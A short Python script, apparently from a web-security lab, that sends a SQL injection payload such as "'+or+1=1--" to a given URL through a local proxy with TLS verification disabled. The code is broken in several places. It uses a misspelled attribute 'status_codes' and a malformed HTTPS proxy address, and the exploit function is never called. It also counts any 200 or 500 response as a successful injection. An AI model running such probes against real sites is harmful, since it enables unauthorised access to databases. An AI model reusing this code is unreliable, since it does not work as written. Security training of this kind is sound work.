import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http' : 'http://127.0.0.1:8087', 'https':'https//127.0.0.1:8087'}

def exploit_sqli(url, uri, payloads):
    res = requests.get(url+uri+payloads, verify=False, proxies=proxy)
    
    if res.status_codes == 200 or res.status_code == 500:
        return True
    else :
        return False
    
if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
        uri = sys.argv[2].strip()
        payload = sys.argv[3].strip()
    except IndexError :
        print("[-] %s <url> <uri> <payload>" % sys.argv[0])
        print("[-] %s www.example.com \"/produits=Gifts\" \"'+or+1=1--\"" % sys.argv[0])
        sys.exit(-1)